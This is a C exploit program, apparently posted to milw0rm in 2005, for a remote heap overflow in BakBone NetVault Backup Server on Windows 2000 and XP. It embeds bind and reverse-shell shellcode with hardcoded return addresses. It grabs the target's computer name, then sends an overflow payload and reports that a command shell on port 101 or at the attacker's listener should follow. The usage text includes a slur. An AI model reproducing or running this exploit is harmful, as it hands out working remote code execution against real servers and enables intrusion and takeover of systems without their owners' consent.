/*
for more informations class101.org/netv-remhbof.pdf
*/

#include <stdio.h>
#include <string.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif

char scode1[]=
"\x33\xC9\x83\xE9"
"\xAF\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xBB"
"\x1E\xD3\x6A\x83\xEB\xFC\xE2\xF4\x47\x74\x38\x25\x53\xE7\x2C\x95"
"\x44\x7E\x58\x06\x9F\x3A\x58\x2F\x87\x95\xAF\x6F\xC3\x1F\x3C\xE1"
"\xF4\x06\x58\x35\x9B\x1F\x38\x89\x8B\x57\x58\x5E\x30\x1F\x3D\x5B"
"\x7B\x87\x7F\xEE\x7B\x6A\xD4\xAB\x71\x13\xD2\xA8\x50\xEA\xE8\x3E"
"\x9F\x36\xA6\x89\x30\x41\xF7\x6B\x50\x78\x58\x66\xF0\x95\x8C\x76"
"\xBA\xF5\xD0\x46\x30\x97\xBF\x4E\xA7\x7F\x10\x5B\x7B\x7A\x58\x2A"
"\x8B\x95\x93\x66\x30\x6E\xCF\xC7\x30\x5E\xDB\x34\xD3\x90\x9D\x64"
"\x57\x4E\x2C\xBC\x8A\xC5\xB5\x39\xDD\x76\xE0\x58\xD3\x69\xA0\x58"
"\xE4\x4A\x2C\xBA\xD3\xD5\x3E\x96\x80\x4E\x2C\xBC\xE4\x97\x36\x0C"
"\x3A\xF3\xDB\x68\xEE\x74\xD1\x95\x6B\x76\x0A\x63\x4E\xB3\x84\x95"
"\x6D\x4D\x80\x39\xE8\x4D\x90\x39\xF8\x4D\x2C\xBA\xDD\x76\xD3\x0F"
"\xDD\x4D\x5A\x8B\x2E\x76\x77\x70\xCB\xD9\x84\x95\x6D\x74\xC3\x3B"
"\xEE\xE1\x03\x02\x1F\xB3\xFD\x83\xEC\xE1\x05\x39\xEE\xE1\x03\x02"
"\x5E\x57\x55\x23\xEC\xE1\x05\x3A\xEF\x4A\x86\x95\x6B\x8D\xBB\x8D"
"\xC2\xD8\xAA\x3D\x44\xC8\x86\x95\x6B\x78\xB9\x0E\xDD\x76\xB0\x07"
"\x32\xFB\xB9\x3A\xE2\x37\x1F\xE3\x5C\x74\x97\xE3\x59\x2F\x13\x99"
"\x11\xE0\x91\x47\x45\x5C\xFF\xF9\x36\x64\xEB\xC1\x10\xB5\xBB\x18"
"\x45\xAD\xC5\x95\xCE\x5A\x2C\xBC\xE0\x49\x81\x3B\xEA\x4F\xB9\x6B"
"\xEA\x4F\x86\x3B\x44\xCE\xBB\xC7\x62\x1B\x1D\x39\x44\xC8\xB9\x95"
"\x44\x29\x2C\xBA\x30\x49\x2F\xE9\x7F\x7A\x2C\xBC\xE9\xE1\x03\x02"
"\x54\xD0\x33\x0A\xE8\xE1\x05\x95\x6B\x1E\xD3\x6A";


char scode2[]=
/*original vlad902's reverse shellcode from metasploit.com
NOT xored, modded by class101 for ca's xpl0it to remove the common badchar "\x20"
original bytes + modded = 291 + 3 = 294 bytes reverse shellcode v1.31*/
"\xFC\x6A\xEB\x52" /*modded adjusting jump*/
"\xE8\xF9\xFF\xFF\xFF\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x7C\x05"
"\x78\x01\xEF"
"\x83\xC7\x01" /*modded, adding 1 to edi*/
"\x8B\x4F\x17" /*modded, adjusting ecx*/
"\x8B\x5F\x1F" /*modded, adjusting ebx, "\x20" out, yeahouu ;>*/
"\x01\xEB\xE3\x30\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xAC\x84\xC0"
"\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE3"
"\x8B\x5F\x23" /*modded, adjusting ebx*/
"\x01\xEB\x66\x8B\x0C\x4B"
"\x8B\x5F\x1B" /*modded, adjusting ebx*/
"\x01\xEB\x03\x2C\x8B\x89\x6C\x24\x1C\x61\xC3\x31\xC0\x64\x8B\x40"
"\x30\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\x68\x8E\x4E\x0E"
"\xEC\x50\xFF\xD6\x31\xDB\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32"
"\x5F\x54\xFF\xD0\x68\xCB\xED\xFC\x3B\x50\xFF\xD6\x5F\x89\xE5\x66"
"\x81\xED\x08\x02\x55\x6A\x02\xFF\xD0\x68\xD9\x09\xF5\xAD\x57\xFF"
"\xD6\x53\x53\x53\x53\x43\x53\x43\x53\xFF\xD0\x68\x00\x00\x00\x00"
"\x66\x68\x00\x00\x66\x53\x89\xE1\x95\x68\xEC\xF9\xAA\x60\x57\xFF"
"\xD6\x6A\x10\x51\x55\xFF\xD0\x66\x6A\x64\x66\x68\x63\x6D\x6A\x50"
"\x59\x29\xCC\x89\xE7\x6A\x44\x89\xE2\x31\xC0\xF3\xAA\x95\x89\xFD"
"\xFE\x42\x2D\xFE\x42\x2C\x8D\x7A\x38\xAB\xAB\xAB\x68\x72\xFE\xB3"
"\x16\xFF\x75\x28\xFF\xD6\x5B\x57\x52\x51\x51\x51\x6A\x01\x51\x51"
"\x55\x51\xFF\xD0\x68\xAD\xD9\x05\xCE\x53\xFF\xD6\x6A\xFF\xFF\x37"
"\xFF\xD0\x68\xE7\x79\xC6\x79\xFF\x75\x04\xFF\xD6\xFF\x77\xFC\xFF"
"\xD0\x68\xEF\xCE\xE0\x60\x53\xFF\xD6\xFF\xD0";


char scodeA[] =
"\x11\x03\x00\x00\x01\xCB\x22\x77\xC9\x17\x00\x00\x00\x69\x3B\x69"
"\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69"
"\x3B\x73\x3B\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x0C\x58\x3C\x42"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00";

char scodeB[] =
"\x00\x51\x02\x00\x00\x00\x00\x00\x00\x01\x03\x05\x27\xCA\x07\x00"
"\x00\x00\x73\x3B\x62\x3B\x6F\x3B\x00";

char scodeC[] =
"\x00\x00\x02\x01\x00\x00\x00\x8F\xD0\xF0\xCA\x0B\x00\x00"
"\x00\x69\x3B\x62\x3B\x6F\x3B\x6F\x3B\x7A\x3B\x00\x11\x57\x3C\x42"
"\x00\x01\xB9\xF9\xA2\xC8\x00\x00\x00\x00\x03\x00\x00\x00\x00\x01"
"\xA5\x97\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20\x00\x00"
"\x00\x10\x02\x4E\x3F\xAC\x14\xCC\x0A\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\xA5\x97\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20"
"\x00\x00\x00\x10\x02\x4E\x3F\xC0\xA8\xEA\xEB\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x01\xA5\x97\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B"
"\x00\x20\x00\x00\x00\x10\x02\x4E\x3F\xC2\x97\x2C\xD3\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\xB9\xF9\xA2\xC8\x02\x02\x00\x00\x00\xA5\x97"
"\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20\x00\x00\x00\x04"
"\x02\x4E\x3F\xAC\x14\xCC\x0A\xB0\xFC\xE2\x00\x00\x00\x00\x00\xEC"
"\xFA\x8E\x01\xA4\x6B\x41\x00\xE4\xFA\x8E\x01\xFF\xFF\xFF\xFF\x01"
"\x02\x00\x00\x00";

char scodeD[] =
"\x00\x06\x00\x00\x00\x0B\x00\x00\x00\x05\x00\x00\x00\x54"
"\x79\x70\x65\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00"
"\x77\x69\x6E\x6E\x74\x00\x12\x00\x00\x00\x55\x44\x50\x20\x46\x72"
"\x61\x67\x6D\x65\x6E\x74\x20\x53\x69\x7A\x65\x00\x01\x00\x00\x00"
"\x01\x00\x00\x00\x05\x00\x00\x00\x31\x34\x30\x30\x00\x07\x00\x00"
"\x00\x53\x65\x72\x76\x65\x72\x00\x01\x00\x00\x00\x01\x00\x00\x00"
"\x05\x00\x00\x00\x54\x52\x55\x45\x00\x0C\x00\x00\x00\x44\x65\x73"
"\x63\x72\x69\x70\x74\x69\x6F\x6E\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x0A\x00\x00\x00\x4E\x56\x56\x65\x72\x73\x69\x6F\x6E\x00\x01"
"\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x37\x30\x33\x30\x00"
"\x0D\x00\x00\x00\x4E\x56\x42\x75\x69\x6C\x64\x4C\x65\x76\x65\x6C"
"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x33\x37\x00";

char grabcpname[] =
"\xC9\x00\x00\x00\x01\xCB\x22\x77\xC9\x17\x00\x00\x00\x69\x3B\x69"
"\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69\x3B\x69"
"\x3B\x73\x3B\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00"
"\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x09\x00\x00\x00\x00\x00\x00\x00\x00";

char payload[1024],payload2[20000000],recvbuf[1024],ver2[1024],cpname[1024],sz[1024],szb[1024],szb2[1024];
int tot,tot2,l00p=0;

char sip[3],spo[1],pad[]="\xEB\x0A",pad2[]="\xE9\xF3\xFD\xFF\xFF";
char ret1[]="\x7E\x6D\x03\x75"; //call dword [esi+4C], ws2_32.dll, w2k SP4 EN
char ret1c[]="\xBD\x9B\x36\x7C"; //call dword [edi+74], MSVCR71.dll, XP SP1a-1-0 EN
char ret2[]="\xF0\xA1\x5C\x7C"; //UEF (UnHandledExceptionFilter) w2k sp4 EN
char ret4[]="\xB4\x73\xED\x77"; //UEF XP SP1a-1-0 EN
char padA[]="\x00\x00\x00";
char szc[]="\xFF\xFF";

// rtlmethod char repair[]="\xC7\x40\x89\x60\x20\xF8\x77"; repairing RtlEnterCriticalSection on 2k SP4
//you will prolly need to repair this repair[] for your os :>
//I did it quickly: mov dword ptr [eax-77],77F82060
//for litchfield this method is reliable due to the fixed address 0x7FFDF020
//for me that's a crap method like others known heap exploitations
//because you realiably repair the functions across all nt based os?, and where to realiably jump...,
//and also the call to drwtsn32, right before ExitProcess(), acts as a breakpoint, and your shellcode will be executed
//once 'OK' or 'CANCEL' clicked. At least this is still a 'fun' ExitProcess() :)

#ifdef WIN32
WSADATA wsadata;
#endif

void ver();
void usage(char* us);
void sl(int time);

int main(int argc,char *argv[])
{
ver();
int check1, check2, rc, i, j, k;
unsigned long gip;
unsigned short gport;
char *what, *where, *os;
loop:
if (argc>6||argc<3||atoi(argv[1])>2||atoi(argv[1])<1){usage(argv[0]);return -1;}
if (argc==5){usage(argv[0]);return -1;}
if (strlen(argv[2])<7){usage(argv[0]);return -1;}
if (argc==6)
{
if (strlen(argv[4])<7){usage(argv[0]);return -1;}
}
#ifndef WIN32
if (argc==6)
{
gip=inet_addr(argv[4])^(long)0x00000000;
gport=htons(atoi(argv[5]))^(short)0x0000;
memcpy(&sip[0], &gip, 4);memcpy(&spo[0], &gport, 2);
check1=strlen(&sip[0]);check2=strlen(&spo[0]);
if (check1 == 0||check1 == 1||check1 == 2||check1 == 3){
printf("[+] error, the IP has a null byte in hex...\n");return -1;}
if (check2 != 2){printf("[+] error, the PORT has a null byte in hex...\n");return -1;}
}
#define Sleep sleep
#define SOCKET int
#define closesocket(s) close(s)
#else
if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup error\n");return -1;}
if (argc==6)
{
gip=inet_addr(argv[4])^(ULONG)0x00000000;
gport=htons(atoi(argv[5]))^(USHORT)0x0000;
memcpy(&sip[0], &gip, 4);memcpy(&spo[0], &gport, 2);
check1=strlen(&sip[0]);check2=strlen(&spo[0]);
if (check1 == 0||check1 == 1||check1 == 2||check1 == 3){
printf("[+] error, the IP has a null byte in hex...\n");return -1;}
if (check2 != 2){printf("[+] error, the PORT has a null byte in hex...\n");return -1;}
}
#endif
int ip=htonl(inet_addr(argv[2])), port;
if (argc==4||argc==6){port=atoi(argv[3]);} else port=20031;
SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
s=socket(AF_INET,SOCK_STREAM,0);
if (s==-1){printf("[+] socket() error\n");return -1;}
if (atoi(argv[1]) == 1){what=ret1;where=ret2;os="Win2k SP4 Server English\n[+] Win2k SP4 Pro English\n";}
if (atoi(argv[1]) == 2){what=ret1c;where=ret4;os="WinXP SP0 Pro. English\n[+] WinXP SP1 Pro. English\n[+] WinXP SP1a Pro. English\n";}
if (l00p==0){printf("[+] TARGET: %s\n",os);sl(1);}
server.sin_family=AF_INET;
server.sin_addr.s_addr=htonl(ip);
server.sin_port=htons(port);
connect(s,( struct sockaddr *)&server,sizeof(server));
timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
switch(select(s+1,NULL,&mask,NULL,&timeout))
{
case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
default:
if(FD_ISSET(s,&mask))
{
if (l00p==0)
{
printf("[+] connection 1: grabbing computername via netvault...\n");
sl(2);
send(s,grabcpname,sizeof(grabcpname)-1,0);
rc = recv(s,recvbuf,sizeof(recvbuf),0);
if (rc==-1||rc<400||recvbuf[13]!=105&&recvbuf[14]!=59){printf("[+] not netvault or patched, aborting..\n");return -1;}
else if (rc==0){printf("[+] nothing received, not netvault or patched, aborting..\n");return -1;}
else printf("[+] analyzing packets, sorting computername\n");
sl(2);
printf("[+] bufsize: %d\n",rc);sl(1);
for (i=80,j=0;recvbuf[i]!=0;i++,j++)
{
memset(cpname+j,recvbuf[i],1);
}
memset(sz,strlen(cpname)+1,1);
memset(ver2,recvbuf[rc-37],1);memset(ver2+1,0x2E,1);
memset(ver2+2,recvbuf[rc-35],1);memset(ver2+3,0x2E,1);
memset(ver2+4,recvbuf[rc-34],1);
printf("[+] cmpname: %s\n",cpname);sl(1);
printf("[+] version: %s\n",ver2);sl(1);l00p++;
closesocket(s);
#ifdef WIN32
WSACleanup();
#endif
goto loop;
}
printf("[+]\n[+] connection 2: modding payload regarding computername and length\n");sl(1);
printf("[+] loading attack\n");sl(1);
/*the cpname length is important, that's why we reajust EAX and ECX
function of cpnamelength.*/
k=7-strlen(cpname);
memset(payload,0x41,1);
// rtlmethod memset(payload2,0x90,k+32417); rtl
// rtlmethod memcpy(payload2+k+32417,"\x1C\xF0\xFD\x7F",4);
// rtlmethod memcpy(payload2+k+32421,"\x1A\x9E\xEA\x00",4);
// rtlmethod memcpy(payload2+k+31902, repair, 7);
memset(payload2,0x90,k+35431);
memcpy(payload2+k+32413,pad,2);memcpy(payload2+k+32417,what,4);memcpy(payload2+k+32421,where,4);memcpy(payload2+k+32426,pad2,5);
if (argc==6)
{
memcpy(&scode2[167], &gip, 4);
memcpy(&scode2[173], &gport, 2);
memcpy(payload2+k+31914,scode2,strlen(scode2));
}
else memcpy(payload2+k+31914,scode1,strlen(scode1));
tot=sizeof(padA)-1+sizeof(scodeA)-1+sizeof(scodeB)-1+sizeof(scodeC)-1+sizeof(scodeD)-1+strlen(payload)+strlen(payload2)+strlen(sz)+strlen(cpname);
tot2=tot-192;
memcpy(szb,&tot,2);memcpy(&scodeA[0],&szb,strlen(szb));
memcpy(szb2,&tot2,2);memcpy(&scodeB[1],&szb2,strlen(szb2));
memcpy(scodeC+254,szc,2);
printf("[+] sh0uting the heap!\n");sl(3);
if (send(s,scodeA,sizeof(scodeA)-1,0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,scodeB,sizeof(scodeB)-1,0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,sz,strlen(sz),0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,padA,sizeof(padA)-1,0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,cpname,strlen(cpname),0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,scodeC,sizeof(scodeC)-1,0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
if (send(s,payload2,strlen(payload2),0)==-1) { printf("[+] sending error, the server prolly rebooted.\n");return -1;}
sl(6);
printf("[+]\n[+] size of payload: %d\n",tot);
if (argc==6){printf("[+] payload sent, look at your listener, you should get a shell\n");}
else printf("[+] payload sent, use telnet %s:101 to get a shell\n",inet_ntoa(server.sin_addr));
return 0;
}
}
closesocket(s);
#ifdef WIN32
WSACleanup();
#endif
return 0;
}


void usage(char* us)
{

printf(" \n");
printf("[+] . 101_netvault.exe Target VulnIP (bind mode) \n");
printf("[+] . 101_netvault.exe Target VulnIP VulnPORT (bind mode) \n");
printf("[+] . 101_netvault.exe Target VulnIP VulnPORT GayIP GayPORT reverse mode) \n");
printf("TARGETS: \n");
printf("[+] 1. Win2k SP4 Server English (*) - v5.0.2195 \n");
printf("[+] 1. Win2k SP4 Pro English (*) - v5.0.2195 \n");
printf("[+] 2. WinXP SP0 Pro. English - v5.1.2600 \n");
printf("[+] 2. WinXP SP1 Pro. English (*) - v5.1.2600 \n");
printf("[+] 2. WinXP SP1a Pro. English (*) - v5.1.2600 \n");
printf("NOTE: \n");
printf("The exploit bind a cmdshell port 101 or \n");
printf("reverse a cmdshell on your listener. \n");
printf("A wildcard (*) mean tested working, else, supposed working. \n");
printf("A symbol (-) mean all. \n");
printf(" Compilation msvc6, cygwin, Linux. \n");
printf(" \n");
return;
}

void ver()
{
printf(" \n");
printf("============================[v0.1]====\n");
printf("=====BakBone NetVault, Backup Server===============\n");
printf("=====Clientname, Remote Heap Overflow Exploit==========\n");
printf("====coded by class101======[Hat-Squad.com 2005]=====\n");
printf("============================================\n");
printf(" \n");
}

void sl(int time)
{
#ifdef WIN32
Sleep(time*1000);
#else
Sleep(time);
#endif
}

// milw0rm.com [2005-04-01]
